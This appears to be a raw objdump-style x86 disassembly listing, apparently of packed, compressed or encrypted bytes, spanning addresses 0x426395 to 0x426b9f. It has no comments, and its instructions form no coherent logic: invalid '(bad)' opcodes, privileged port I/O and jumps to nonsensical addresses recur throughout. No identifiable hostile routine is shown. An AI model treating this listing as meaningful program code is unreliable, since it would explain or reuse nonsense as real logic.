  426395:	jmp    0x5eddce93
  42639a:	clc    
  42639b:	sub    BYTE PTR [esp+ebp*4-0x5b73d697],cl
  4263a2:	cmc    
  4263a3:	sub    BYTE PTR [edi-0x18],ah
  4263a6:	xchg   ebx,eax
  4263a7:	xchg   ebx,eax
  4263a8:	jb     0x426397
  4263aa:	fsubr  DWORD PTR [eax*1-0x7b6b5996]
  4263b1:	sub    DWORD PTR [eax+0x1d],ebx
  4263b4:	dec    esp
  4263b5:	and    eax,0xbfc05f28
  4263ba:	scas   al,BYTE PTR es:[edi]
  4263bb:	push   edi
  4263bc:	or     ecx,ebp
  4263be:	add    BYTE PTR [edx],dl
  4263c0:	pop    edi
  4263c1:	in     eax,dx
  4263c2:	push   0xffffff8d
  4263c4:	xchg   ecx,eax
  4263c5:	jle    0x4263c7
  4263c7:	dec    edi
  4263c8:	call   0xdc45e14d
  4263cd:	dec    ecx
  4263ce:	mov    ebp,esi
  4263d0:	test   DWORD PTR [esi+0x57],0x8d0a9180
  4263d7:	xor    al,0xe9
  4263d9:	mov    esi,DWORD PTR [edi-0x65]
  4263dc:	loop   0x426422
  4263de:	lock pop eax
  4263e0:	sbb    eax,0x16fa0e81
  4263e5:	shl    BYTE PTR [esi+ebp*1-0x2c],cl
  4263e9:	cmp    DWORD PTR [eax],edx
  4263eb:	xchg   edi,eax
  4263ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263ed:	cmp    DWORD PTR [esi-0x25],eax
  4263f0:	xchg   BYTE PTR [eax+edx*2],bl
  4263f3:	imul   eax,DWORD PTR [edi-0x1803afff],0xffffffc0
  4263fa:	adc    cl,BYTE PTR [ebx-0x64b97823]
  426400:	push   ss
  426401:	shl    DWORD PTR [ebp-0x55],0x85
  426405:	add    bh,bh
  426407:	xchg   BYTE PTR [edi],dh
  426409:	adc    al,0x40
  42640b:	mov    ebx,DWORD PTR [ecx+ecx*8-0x1]
  42640f:	loop   0x426418
  426411:	add    DWORD PTR [eax],eax
  426413:	jnp    0x426479
  426415:	inc    esp
  426416:	sbb    al,0xb1
  426418:	out    0x87,eax
  42641a:	inc    esi
  42641b:	mov    bl,0x5e
  42641d:	aas    
  42641e:	xor    al,0xb8
  426420:	stos   DWORD PTR es:[edi],eax
  426421:	mov    DWORD PTR [esi+0x0],ebx
  426424:	iret   
  426425:	adc    BYTE PTR [esp+ebx*2],dl
  426428:	test   DWORD PTR [ebx-0x34fa7506],ebx
  42642e:	jns    0x4263f4
  426430:	aas    
  426431:	fs aas 
  426433:	inc    esp
  426434:	mov    al,ds:0xf4687dc
  426439:	dec    sp
  42643b:	sbb    al,0xc3
  42643d:	adc    dh,dh
  42643f:	jmp    DWORD PTR [edx+0x6f]
  426442:	aaa    
  426443:	add    DWORD PTR ds:0xaa101a3d,esp
  426449:	and    al,ch
  42644b:	jmp    FWORD PTR [edx+eax*2-0x1]
  42644f:	mov    BYTE PTR [esi-0x5878fd5c],bl
  426455:	js     0x4263de
  426457:	inc    esp
  426458:	ds xchg esp,eax
  42645a:	lea    eax,[ebx+0x6e]
  42645d:	or     DWORD PTR [edx-0x4602a9dd],edi
  426463:	and    edx,DWORD PTR [edx-0x30]
  426466:	add    DWORD PTR [esi+edi*1-0x50],0x7c53face
  42646e:	lea    ecx,[ebp+0x66]
  426471:	stc    
  426472:	jmp    0x66daea9a
  426477:	sbb    al,0x62
  426479:	xor    BYTE PTR ds:0xea4389d7,0x6f
  426480:	sub    dh,ah
  426482:	fild   WORD PTR [edi+0x36]
  426485:	popf   
  426486:	(bad)  
  426487:	jae    0x426489
  426489:	pop    edx
  42648a:	enter  0x7de9,0x8
  42648e:	mov    cl,bl
  426490:	out    0x5f,al
  426492:	iret   
  426493:	mov    edi,0xd1806222
  426498:	cli    
  426499:	outs   dx,DWORD PTR ds:[esi]
  42649a:	and    al,0xb
  42649c:	inc    eax
  42649d:	bound  ecx,QWORD PTR [ecx]
  42649f:	fmul   DWORD PTR [edi-0x15]
  4264a2:	dec    esi
  4264a3:	retf   0xec88
  4264a6:	inc    edi
  4264a7:	addr16 pop edi
  4264a9:	gs pop ds
  4264ab:	jns    0x4264a8
  4264ad:	ja     0x426473
  4264af:	or     al,BYTE PTR [eax+0x62]
  4264b2:	sti    
  4264b3:	push   ebp
  4264b4:	or     DWORD PTR [ecx+0x1d],0xd9620005
  4264bb:	pushf  
  4264bc:	sbb    BYTE PTR [ecx],bh
  4264be:	or     al,0xf4
  4264c0:	sar    BYTE PTR [eax],1
  4264c2:	or     al,0xf0
  4264c4:	js     0x42647d
  4264c6:	loope  0x4264c7
  4264c8:	push   es
  4264c9:	and    al,0x96
  4264cb:	call   0x6528874f
  4264d0:	aaa    
  4264d1:	sbb    DWORD PTR [esi-0x699a130d],edx
  4264d7:	aad    0x5f
  4264d9:	outs   dx,DWORD PTR ds:[esi]
  4264da:	sbb    eax,ebp
  4264dc:	add    BYTE PTR [eax-0x7f7d17d7],0x2d
  4264e3:	call   0xc173ed74
  4264e8:	and    cl,ch
  4264ea:	xchg   ebp,eax
  4264eb:	ret    
  4264ec:	mov    eax,DWORD PTR [eax]
  4264ee:	daa    
  4264ef:	in     eax,dx
  4264f0:	lock mov esi,0x201c6265
  4264f6:	pop    esi
  4264f7:	bound  esp,QWORD PTR ds:0x71a6dd24
  4264fd:	adc    al,0xeb
  4264ff:	cmp    BYTE PTR cs:[ebp-0x299ed2e8],cl
  426506:	adc    eax,0xa9993581
  42650b:	xchg   ebp,eax
  42650c:	mov    bh,0x43
  42650e:	cmp    DWORD PTR [edi],esi
  426510:	pop    ds
  426511:	mov    edi,DWORD PTR [edi+0x33]
  426514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426515:	and    al,0x62
  426517:	sub    al,0x5f
  426519:	push   0x83607d05
  42651e:	mov    es,esp
  426520:	mov    dh,0xcd
  426522:	adc    BYTE PTR [ecx-0x6a941bf6],al
  426528:	pop    edi
  426529:	fstp   DWORD PTR [ebp+0x3]
  42652c:	call   0x682802bb
  426531:	sti    
  426532:	pop    ebp
  426533:	fld    DWORD PTR [eax]
  426535:	fs push ds
  426537:	jmp    0xe0941ec7
  42653c:	inc    esp
  42653d:	sbb    cl,ch
  42653f:	lahf   
  426540:	jmp    0xfad33f5a
  426545:	bound  ebx,QWORD PTR [ecx]
  426547:	loope  0x42650b
  426549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42654a:	inc    ebp
  42654b:	in     al,0x0
  42654d:	jb     0x42656e
  42654f:	loope  0x4264dc
  426551:	lods   eax,DWORD PTR ds:[esi]
  426552:	add    BYTE PTR [ebp-0x43],dh
  426555:	dec    edi
  426556:	and    DWORD PTR [ecx+0x66],0x4d
  42655a:	lds    eax,FWORD PTR [ecx+0x2a]
  42655d:	push   ecx
  42655e:	ds jne 0x42654f
  426561:	xor    bh,dh
  426563:	and    DWORD PTR [ebp-0x390d567b],edx
  426569:	stc    
  42656a:	hlt    
  42656b:	popf   
  42656c:	out    dx,al
  42656d:	inc    eax
  42656e:	jmp    0xe940e30d
  426573:	popa   
  426574:	loopne 0x4264fa
  426576:	and    esp,DWORD PTR [edi-0x27]
  426579:	add    ah,ch
  42657b:	ja     0x426535
  42657d:	add    cl,ch
  42657f:	int    0xe4
  426581:	ret    0x8225
  426584:	in     al,0x0
  426586:	aam    0x40
  426588:	xchg   esp,eax
  426589:	cli    
  42658a:	jmp    0xea2ec3eb
  42658f:	popa   
  426590:	fld    st(2)
  426592:	and    eax,0x7fffe442
  426597:	add    cl,bl
  426599:	add    cl,ch
  42659b:	loope  0x4265a9
  42659d:	or     ecx,ebp
  42659f:	call   0x6db26a78
  4265a4:	mov    eax,0xe0686234
  4265a9:	shl    DWORD PTR [ebp+0x78c145],0xe9
  4265b0:	xchg   edi,eax
  4265b1:	cli    
  4265b2:	mov    bh,bh
  4265b4:	repz sub al,0x89
  4265b7:	add    BYTE PTR [edi],cl
  4265b9:	hlt    
  4265ba:	xor    BYTE PTR [ebp+0x43],dh
  4265bd:	pop    ebp
  4265be:	mov    esi,0xd84bd0
  4265c3:	jmp    0x426602
  4265c5:	pop    ebp
  4265c6:	mov    esi,0xd83a80
  4265cb:	mov    edi,ebp
  4265cd:	lahf   
  4265ce:	mov    ah,0xff
  4265d0:	or     esi,DWORD PTR fs:[esi+0x39]
  4265d4:	cmp    ebx,DWORD PTR [edi+0x49]
  4265d7:	add    al,0x4
  4265d9:	call   0x8b00:0xe074830a
  4265e0:	dec    edi
  4265e1:	mov    ecx,0xb9478918
  4265e6:	and    BYTE PTR [ecx-0x76e346d1],cl
  4265ec:	das    
  4265ed:	mov    ecx,0xa7b97514
  4265f2:	or     edi,0xffffffb3
  4265f5:	bound  edx,QWORD PTR [eax+eax*1]
  4265f8:	mov    ebx,0x97245560
  4265fd:	pusha  
  4265fe:	dec    ebp
  4265ff:	and    al,0xab
  426601:	add    BYTE PTR [edx],bl
  426603:	test   DWORD PTR [ebx],ecx
  426605:	test   BYTE PTR [ecx],cl
  426607:	add    DWORD PTR [ecx+ebp*2+0x1],0x0
  42660c:	mov    ebx,0xa61ae20c
  426611:	xlat   BYTE PTR ds:[ebx]
  426612:	and    BYTE PTR [eax],al
  426614:	mov    ecx,DWORD PTR [ebx+eiz*1+0x13d1c83]
  42661b:	add    BYTE PTR [eax],al
  42661d:	jnp    0x4265f6
  42661f:	xchg   DWORD PTR [edi+0xdce7],eax
  426625:	fcmovnbe st,st(7)
  426627:	test   al,al
  426629:	bound  esi,QWORD PTR [esi-0x21e172ea]
  42662f:	sub    al,0x50
  426631:	out    dx,eax
  426632:	inc    esp
  426633:	sbb    bl,BYTE PTR [eax]
  426635:	mov    dl,0x71
  426637:	mov    ebx,ecx
  426639:	cmp    bl,dh
  42663b:	pop    ss
  42663c:	add    BYTE PTR [edx-0x9],ah
  42663f:	shl    BYTE PTR [ebx],1
  426641:	push   esi
  426642:	out    0xff,eax
  426644:	gs pop esi
  426646:	cwde   
  426647:	xor    ecx,ecx
  426649:	jns    0x42660c
  42664b:	lock dec esp
  42664d:	call   0xc67a:0x9648356c
  426654:	jae    0x4266bb
  426656:	dec    eax
  426657:	jmp    0x42669e
  426659:	fstp   TBYTE PTR [edx]
  42665b:	into   
  42665c:	ret    0x689c
  42665f:	push   es
  426660:	add    BYTE PTR [edx-0x80],ah
  426663:	imul   esi,DWORD PTR [edi],0xc2d4c2eb
  426669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42666a:	enter  0x22ba,0x62
  42666e:	sub    BYTE PTR [ecx+0x2b],0xe9
  426672:	fisttp QWORD PTR [eax+0x15]
  426675:	and    al,BYTE PTR [eax-0x5a702c8b]
  42667b:	add    DWORD PTR [eax],eax
  42667d:	(bad)  
  42667e:	int3   
  42667f:	int3   
  426680:	cli    
  426681:	add    BYTE PTR [ebp+0x624fdbff],dl
  426687:	(bad)  
  426688:	fist   DWORD PTR [ebx+0x62]
  42668b:	stc    
  42668c:	mov    ebx,0x898cb957
  426691:	inc    edi
  426692:	outs   dx,BYTE PTR ds:[esi]
  426693:	pop    es
  426694:	ror    DWORD PTR [edi],0x6b
  426697:	rcl    DWORD PTR [edi+ebp*1],0x9b
  42669b:	stc    
  42669c:	retf   
  42669d:	dec    edi
  42669e:	fcomi  st,st(2)
  4266a0:	fmul   QWORD PTR [eax+0x74bbd92c]
  4266a6:	inc    ebp
  4266a7:	xchg   edx,eax
  4266a8:	cmc    
  4266a9:	xchg   ebx,eax
  4266aa:	push   ebx
  4266ab:	sbb    eax,ebp
  4266ad:	and    esi,0xffffffbc
  4266b0:	test   BYTE PTR [ebx],0xd7
  4266b3:	fisubr DWORD PTR [esi+0x45]
  4266b6:	dec    edx
  4266b7:	inc    ebx
  4266b8:	pop    edi
  4266b9:	je     0x426704
  4266bb:	pop    esi
  4266bc:	lahf   
  4266bd:	pop    es
  4266be:	cmp    bh,BYTE PTR [edx-0x72]
  4266c1:	jne    0x4266fc
  4266c3:	pop    esi
  4266c4:	das    
  4266c5:	imul   edi,DWORD PTR [edi],0x51
  4266c8:	call   0x131c2ad0
  4266cd:	cs (bad) 
  4266cf:	jmp    DWORD PTR [ebx-0x3c13e6fd]
  4266d5:	adc    DWORD PTR [edx-0x4b2a6527],esp
  4266db:	pop    esi
  4266dc:	or     eax,0xe7e0c7d6
  4266e1:	shl    bh,1
  4266e3:	xor    al,0xc
  4266e5:	add    BYTE PTR [eax],al
  4266e7:	(bad)
  4266eb:	inc    ecx
  4266ec:	icebp  
  4266ed:	imul   ecx,DWORD PTR [edi-0x29],0x19
  4266f1:	hlt    
  4266f2:	sub    BYTE PTR [ecx],0x9
  4266f5:	dec    esi
  4266f6:	add    al,0x69
  4266f8:	sbb    eax,0x6e8c5cb0
  4266fd:	mov    bl,0x73
  4266ff:	fld    QWORD PTR [eax-0x22c89e9b]
  426705:	aad    0x43
  426707:	mov    ebp,0x51de31fb
  42670c:	jmp    edi
  42670e:	jb     0x42677f
  426710:	and    DWORD PTR [ebx],ecx
  426712:	enter  0x929d,0xdd
  426716:	outs   dx,DWORD PTR ds:[esi]
  426717:	jb     0x426732
  426719:	call   0x19df99c
  42671e:	jg     0x4266aa
  426720:	push   ss
  426721:	xchg   BYTE PTR ds:0xf7ded4a,ah
  426727:	pop    esi
  426728:	pusha  
  426729:	inc    ebx
  42672a:	in     eax,0xec
  42672c:	sbb    al,0x25
  42672e:	or     edi,esp
  426730:	push   ss
  426731:	adc    DWORD PTR [ecx+ebp*1-0x23],ebx
  426735:	push   eax
  426736:	jno    0x426768
  426738:	fld    DWORD PTR [edi+0x14944dbf]
  42673e:	or     eax,0xc301196c
  426743:	gs idiv ecx
  426746:	mov    edi,0xab4b2019
  42674b:	add    BYTE PTR [ecx-0x6c],ah
  42674e:	je     0x426749
  426750:	or     edx,DWORD PTR [esp+edx*1+0x1197775]
  426757:	ins    BYTE PTR es:[edi],dx
  426758:	sahf   
  426759:	push   es
  42675a:	(bad)  
  42675c:	mov    eax,ds:0x93934681
  426761:	xchg   esp,eax
  426762:	xchg   BYTE PTR [edi],bl
  426764:	sahf   
  426765:	and    bh,BYTE PTR [ecx-0x3f409e17]
  42676b:	shl    BYTE PTR [edi+0x49],cl
  42676e:	add    BYTE PTR [edi],dh
  426770:	adc    DWORD PTR [esi],ebp
  426772:	push   esi
  426773:	stos   DWORD PTR es:[edi],eax
  426774:	jno    0x42674f
  426776:	push   edx
  426777:	jb     0x4267c7
  426779:	pushf  
  42677a:	add    ecx,DWORD PTR [ecx]
  42677c:	add    al,0x1a
  42677e:	add    DWORD PTR [edx-0x45],ebp
  426781:	fadd   DWORD PTR [eax]
  426783:	push   0xffffffcb
  426785:	in     al,0x0
  426787:	je     0x426734
  426789:	in     al,dx
  42678a:	push   eax
  42678b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42678c:	fwait
  42678d:	loopne 0x42678e
  42678f:	lods   eax,DWORD PTR ds:[esi]
  426790:	fsubr  QWORD PTR [eax+0x46]
  426794:	mov    eax,ds:0xb600fb90
  426799:	les    ecx,FWORD PTR [edx]
  42679b:	inc    eax
  42679c:	jnp    0x4267f5
  42679e:	pop    edi
  42679f:	sub    al,0x7b
  4267a1:	movsx  ebx,WORD PTR [esi-0x38]
  4267a5:	and    eax,DWORD PTR [eax]
  4267a7:	and    cl,ch
  4267a9:	pushf  
  4267aa:	cli    
  4267ab:	cmp    BYTE PTR [edx],0xd8
  4267ae:	out    0x59,eax
  4267b0:	add    BYTE PTR [edx-0x2a],ah
  4267b3:	add    BYTE PTR [ebp-0x40],dl
  4267b6:	xor    BYTE PTR [eax+0x53],dl
  4267b9:	shr    cl,1
  4267bb:	sub    BYTE PTR [edi+eax*1-0x24],ch
  4267bf:	dec    esi
  4267c0:	mov    eax,DWORD PTR [esi]
  4267c2:	nop
  4267c3:	test   esi,esi
  4267c5:	test   esp,0x887cfe79
  4267cb:	es push edi
  4267cd:	mov    esi,0x4c570e7f
  4267d2:	icebp  
  4267d3:	dec    esp
  4267d4:	adc    cl,bl
  4267d6:	fisttp DWORD PTR [edi+0x6a]
  4267d9:	or     esi,DWORD PTR [edx+0x4f7e0364]
  4267df:	(bad)  
  4267e0:	out    0x48,eax
  4267e2:	in     eax,dx
  4267e3:	(bad)  
  4267e4:	call   esp
  4267e6:	push   cs
  4267e7:	icebp  
  4267e8:	push   esi
  4267ea:	fwait
  4267eb:	or     al,0x40
  4267ed:	sti    
  4267ee:	(bad)  
  4267ef:	rol    BYTE PTR [ebp-0x3f6c25fb],0x8c
  4267f6:	cs sti 
  4267f8:	xor    DWORD PTR [ebx],ecx
  4267fa:	stos   DWORD PTR es:[edi],eax
  4267fb:	push   ebx
  4267fc:	leave  
  4267fd:	stc    
  4267fe:	fadd   DWORD PTR [eax]
  426800:	push   esi
  426801:	fs push cs
  426803:	jge    0x426829
  426805:	fwait
  426806:	or     al,0xf0
  426808:	test   esp,edi
  42680a:	nop
  42680b:	ins    BYTE PTR es:[edi],dx
  42680c:	or     esp,0x9
  42680f:	jne    0x42687e
  426811:	(bad)  
  426813:	ror    DWORD PTR [eax+eax*1-0x52a79c4],1
  42681a:	outs   dx,DWORD PTR ds:[esi]
  42681b:	(bad)  
  42681c:	adc    al,BYTE PTR [eax+0x62]
  42681f:	in     al,dx
  426820:	add    al,0x53
  426822:	test   DWORD PTR [ebp-0x7010e3de],ecx
  426828:	add    al,BYTE PTR [edi+0x292229a7]
  42682e:	arpl   WORD PTR [edx+0x2fdff07d],ax
  426834:	repnz and al,0xe2
  426837:	pushf  
  426838:	and    bl,BYTE PTR [ebx+eiz*2]
  42683b:	dec    ebp
  42683c:	cmp    BYTE PTR [eax],bh
  42683e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42683f:	aam    0x24
  426841:	push   ecx
  426842:	mov    eax,0xa70ac77c
  426847:	rcl    esp,0x52
  42684a:	xor    eax,0xd920226d
  42684f:	mov    ebp,0x817b455c
  426854:	inc    BYTE PTR [esi+0x7476f612]
  42685a:	jp     0x426867
  42685c:	(bad)  
  42685d:	psraw  mm4,mm0
  426860:	add    edi,DWORD PTR [ecx+eiz*2]
  426863:	or     eax,0xdbf42f02
  426868:	cli    
  426869:	mov    WORD PTR [esp+edi*2-0x2ba80532],ds
  426870:	adc    al,BYTE PTR [eax+0x62]
  426873:	shr    DWORD PTR [edi+0x15],cl
  426876:	and    dl,BYTE PTR [edx+0x3600ffbe]
  42687c:	or     ecx,DWORD PTR [eax+0x57]
  42687f:	mov    ecx,0x25c03582
  426884:	out    0x42,al
  426886:	adc    BYTE PTR [edx-0xf],ah
  426889:	cmp    DWORD PTR [esi+edi*2-0x27],0xfffffff3
  42688e:	add    edx,DWORD PTR [ecx]
  426890:	bound  esp,QWORD PTR [ecx+0x145a1ff7]
  426896:	sub    BYTE PTR [edx-0x72],dh
  426899:	adc    al,0xc5
  42689b:	and    al,0x24
  42689d:	jne    0x42687f
  42689f:	jno    0x4268c5
  4268a1:	mov    dh,0x4c
  4268a3:	mov    esp,esp
  4268a5:	and    edx,DWORD PTR [esi]
  4268a7:	and    bl,cl
  4268a9:	pop    esp
  4268aa:	mov    DWORD PTR [ecx-0x23],0xb4f670b7
  4268b1:	sti    
  4268b2:	jle    0x4268cd
  4268b4:	aad    0x52
  4268b6:	test   DWORD PTR [ecx-0x7575c013],0x2286e7d8
  4268c0:	add    eax,0xd5a17ceb
  4268c5:	xor    dh,bh
  4268c7:	sbb    ebp,0x8e61c05c
  4268cd:	mov    eax,0xb59a2807
  4268d2:	jo     0x426923
  4268d4:	sbb    esi,esi
  4268d6:	ret    
  4268d7:	sbb    eax,0xad445e2d
  4268dc:	and    dh,0x35
  4268df:	add    BYTE PTR [edx],ah
  4268e1:	mov    eax,cs:0x66d95a45
  4268e7:	out    dx,eax
  4268e8:	inc    ecx
  4268e9:	jmp    0x62d63fd6
  4268ee:	pop    esp
  4268ef:	sub    BYTE PTR [esi+0x26],al
  4268f2:	push   ebp
  4268f3:	shl    BYTE PTR [ebp+ecx*1+0xc],1
  4268f7:	and    al,0x62
  4268f9:	add    eax,0xb5568335
  4268fe:	or     eax,DWORD PTR [edi+edx*2]
  426901:	pop    ds
  426902:	gs jbe 0x426953
  426905:	and    eax,DWORD PTR [ecx]
  426907:	cli    
  426908:	inc    edx
  426909:	shr    BYTE PTR [edx-0x27],1
  42690c:	lods   eax,DWORD PTR ds:[esi]
  42690d:	into   
  42690e:	aaa    
  42690f:	adc    eax,0xdc73bd7a
  426914:	mov    dh,bl
  426916:	call   DWORD PTR [ebp+0x341cb99a]
  42691c:	ss je  0x42691a
  42691f:	xchg   ch,bh
  426921:	push   ebp
  426922:	stc    
  426923:	fs cmc 
  426925:	add    al,0x27
  426927:	pop    ds
  426928:	or     eax,0xe2c52505
  42692d:	pop    ecx
  42692e:	shr    ecx,1
  426930:	popa   
  426931:	fyl2xp1 
  426933:	aad    0x3d
  426935:	mov    ecx,0x2866c353
  42693a:	push   ecx
  42693b:	dec    esi
  42693c:	pop    edx
  42693d:	mov    ecx,0x83ea512c
  426942:	cli    
  426943:	ds add cl,cl
  426946:	mov    al,ds:0x19e3986
  42694b:	pop    ecx
  42694c:	das    
  42694d:	lds    edx,FWORD PTR [ebx+eax*8+0x12]
  426951:	push   ebx
  426952:	nop
  426953:	jne    0x42691a
  426955:	inc    ebp
  426956:	daa    
  426957:	cli    
  426958:	popf   
  426959:	inc    ebp
  42695a:	mov    ebp,0xbd3d95f9
  42695f:	stc    
  426960:	jge    0x4269a7
  426962:	mov    ebp,0xbd3d75f9
  426967:	stc    
  426968:	jge    0x4269af
  42696a:	mov    ebp,0xbd3d95f9
  42696f:	pop    ecx
  426970:	inc    edi
  426971:	adc    ecx,DWORD PTR [edi+0x21]
  426974:	jmp    0x62958f89
  426979:	aad    0xb8
  42697b:	sbb    BYTE PTR [esi],dh
  42697d:	jmp    0x426906
  42697f:	or     al,BYTE PTR [eax]
  426981:	aas    
  426982:	aas    
  426983:	add    DWORD PTR [eax],eax
  426985:	mov    ebx,0x5539d1c7
  42698a:	in     eax,0x5
  42698c:	test   BYTE PTR [ebx],bh
  42698e:	fadd   DWORD PTR [eax]
  426990:	add    dl,al
  426992:	pushf  
  426993:	push   ds
  426994:	and    BYTE PTR [esp+edx*2-0x2774ff61],dh
  42699b:	aaa    
  42699c:	pop    esp
  42699d:	lahf   
  42699e:	lock add eax,0xd80784
  4269a4:	add    BYTE PTR [eax-0x58],ch
  4269a7:	div    DWORD PTR [eax+eax*1-0x51]
  4269ab:	mov    eax,0xfb4ce849
  4269b0:	cmc    
  4269b1:	push   eax
  4269b3:	das    
  4269b4:	test   ch,ch
  4269b6:	je     0x426a0c
  4269b8:	jg     0x4269ba
  4269ba:	dec    ebx
  4269bb:	fmul   DWORD PTR [ebx+0x5d104f7d]
  4269c1:	and    al,0x47
  4269c3:	mov    ebp,0xe10f4c55
  4269c8:	xor    DWORD PTR [edi+0x7],esi
  4269cb:	test   BYTE PTR ds:0x3988068d,cl
  4269d1:	pop    edi
  4269d2:	test   DWORD PTR [ebx+0x4bcc3b4a],0x94804b75
  4269dc:	push   ds
  4269dd:	and    al,0x6c
  4269df:	and    BYTE PTR [edx],dl
  4269e1:	shr    bl,0xfa
  4269e4:	outs   dx,BYTE PTR ds:[esi]
  4269e5:	adc    BYTE PTR ds:0xa241e94,bh
  4269eb:	sti    
  4269ec:	adc    ecx,DWORD PTR [eax-0x7b0567e7]
  4269f2:	mov    ebx,0xfd6a0c90
  4269f7:	pushf  
  4269f8:	mov    ecx,0xfe7f62e4
  4269fd:	call   DWORD PTR [edi+0x62ffff80]
  426a03:	add    edx,0xfffffff8
  426a06:	mov    ecx,0x124377df
  426a0b:	test   eax,0x8f820023
  426a11:	dec    ecx
  426a12:	mov    DWORD PTR [ebx+0x7],esp
  426a15:	les    edx,FWORD PTR [ebx-0x27]
  426a18:	mov    ebp,0x80eb2828
  426a1d:	jns    0x426a9a
  426a1f:	cmp    dh,ch
  426a21:	imul   ecx,DWORD PTR [ebx],0xfffffff6
  426a24:	ds pop eax
  426a26:	add    al,0xd9
  426a28:	lea    esp,[edx]
  426a2a:	sub    cl,ch
  426a2c:	xor    al,0x5d
  426a2e:	mov    BYTE PTR ds:0xee806bfc,cl
  426a34:	fst    QWORD PTR [eax]
  426a36:	add    dh,ch
  426a38:	xchg   ch,dl
  426a3a:	cli    
  426a3b:	ja     0x426a59
  426a3d:	adc    al,BYTE PTR [eax+0x62]
  426a40:	idiv   DWORD PTR [edi]
  426a42:	out    0x77,eax
  426a44:	adc    edi,ecx
  426a46:	and    edi,DWORD PTR [edx-0x35]
  426a49:	clc    
  426a4a:	and    ecx,DWORD PTR [edx-0x75dc073d]
  426a50:	bound  ebp,QWORD PTR [ebp+0x74]
  426a53:	xchg   BYTE PTR [eax-0x5781ab93],ch
  426a59:	int    0x59
  426a5b:	mov    edi,0x62184047
  426a60:	inc    edx
  426a61:	jns    0x426a54
  426a63:	loope  0x426ab7
  426a65:	add    al,BYTE PTR [eax]
  426a67:	mov    ?,WORD PTR [ebp+0x6d]
  426a6a:	jb     0x426ad2
  426a6c:	adc    DWORD PTR [ebx],0xffffffac
  426a6f:	push   eax
  426a70:	inc    eax
  426a71:	(bad)  
  426a72:	jle    0x426a74
  426a74:	test   cl,bl
  426a76:	jmp    0x426a7b
  426a78:	gs retf 
  426a7a:	out    0xf7,eax
  426a7c:	mov    bl,BYTE PTR fs:[edx]
  426a7f:	ins    DWORD PTR es:[edi],dx
  426a80:	outs   dx,DWORD PTR ds:[esi]
  426a81:	jno    0x426a79
  426a83:	ret    
  426a84:	int    0x57
  426a86:	or     al,BYTE PTR [eax+ebp*1]
  426a89:	xchg   esi,eax
  426a8a:	push   eax
  426a8b:	add    BYTE PTR [ebp-0x32241776],bh
  426a91:	lock and eax,DWORD PTR [edx+edi*4]
  426a95:	fsubr  DWORD PTR [ebx-0x5ea19dfe]
  426a9b:	xor    BYTE PTR [ebp-0x14afcaa0],dh
  426aa1:	sub    al,0x88
  426aa3:	(bad)  [edi+0x1f7f1727]
  426aa9:	lods   eax,DWORD PTR ds:[esi]
  426aaa:	sbb    BYTE PTR [ebp-0x9],ch
  426aad:	loopne 0x426b21
  426aaf:	ss jb  0x426ab9
  426ab2:	and    al,0x4
  426ab4:	add    al,0x8a
  426ab6:	outs   dx,DWORD PTR ds:[esi]
  426ab7:	ss pop esi
  426ab9:	out    0xa7,al
  426abb:	add    ebx,DWORD PTR [ecx-0x5d]
  426abe:	ins    DWORD PTR es:[edi],dx
  426abf:	inc    ebx
  426ac0:	iret   
  426ac1:	rcl    BYTE PTR ds:0xe8893b44,cl
  426ac7:	add    esp,DWORD PTR [edx-0x1]
  426aca:	in     eax,0xd0
  426acc:	lods   al,BYTE PTR ds:[esi]
  426acd:	pop    esp
  426ace:	lods   eax,DWORD PTR ds:[esi]
  426acf:	arpl   WORD PTR [edx+0x28fbb58a],dx
  426ad5:	les    ebx,FWORD PTR [ebx]
  426ad7:	icebp  
  426ad8:	add    BYTE PTR [ecx+0x196c8dd9],ah
  426ade:	mov    ds:0x798e436d,eax
  426ae3:	xor    BYTE PTR [edi],0x5a
  426ae6:	(bad)  
  426ae8:	fstp   DWORD PTR [ebp-0x76]
  426aeb:	mov    ch,0xbb
  426aed:	js     0x426b04
  426aef:	add    ecx,ebp
  426af1:	xchg   ah,ah
  426af3:	cld    
  426af4:	fldenv [ecx]
  426af6:	mov    al,BYTE PTR [edi+0x90467d9]
  426afc:	fs push eax
  426afe:	add    eax,0xd94993c5
  426b03:	add    cl,ch
  426b05:	xchg   esp,eax
  426b06:	mov    ds:0x8185723e,al
  426b0b:	shr    BYTE PTR [eax+0x49],0x8e
  426b0f:	mov    edi,ebp
  426b11:	and    BYTE PTR [edi],dl
  426b13:	add    eax,0xfa89a9f9
  426b18:	scas   al,BYTE PTR es:[edi]
  426b19:	mov    al,ds:0x61e92cdd
  426b1e:	(bad)  [ebx-0x497e91d9]
  426b24:	mov    esi,0x2c85d966
  426b29:	sbb    ah,BYTE PTR [eax+0x43]
  426b2c:	mov    ebp,0x60e113fc
  426b31:	mov    al,ds:0xeb1852c9
  426b36:	pop    ebx
  426b37:	jecxz  0x426b9e
  426b39:	stc    
  426b3a:	(bad)  
  426b3b:	jmp    0xda526bde
  426b40:	add    BYTE PTR [eax-0x27166e2c],dh
  426b46:	stc    
  426b47:	fld    DWORD PTR [eax]
  426b49:	sub    BYTE PTR [eax-0x4516ff26],0x5e
  426b50:	jecxz  0x426b87
  426b52:	leave  
  426b53:	test   bl,al
  426b55:	jmp    0x9c8a84bb
  426b5a:	mov    dh,0x9c
  426b5c:	test   BYTE PTR ds:0xedfa8488,dh
  426b62:	popa   
  426b63:	fld    DWORD PTR [eax]
  426b65:	adc    DWORD PTR [ecx-0x2f],0xaafb0000
  426b6c:	lea    ecx,[ebp-0xa0ca9]
  426b72:	arpl   WORD PTR [eax-0x49],bp
  426b75:	(bad)  
  426b76:	cld    
  426b77:	pop    edi
  426b78:	fs cld 
  426b7a:	sti    
  426b7b:	rep ins DWORD PTR es:[edi],dx
  426b7d:	or     BYTE PTR [ecx],dh
  426b7f:	(bad)  
  426b81:	ja     0x426b4a
  426b83:	repz adc esp,DWORD PTR [ebp+edx*8-0x64]
  426b88:	cli    
  426b89:	xor    bh,0x90
  426b8c:	bound  esi,QWORD PTR [eax]
  426b8e:	mov    bl,0xdc
  426b90:	add    BYTE PTR [esi-0x14],dl
  426b93:	mov    edi,esi
  426b95:	(bad)  
  426b96:	xchg   esi,eax
  426b97:	mov    al,ds:0x5fbb4010
  426b9c:	lds    ecx,FWORD PTR [eax+ecx*1]
  426b9f:	inc    ecx
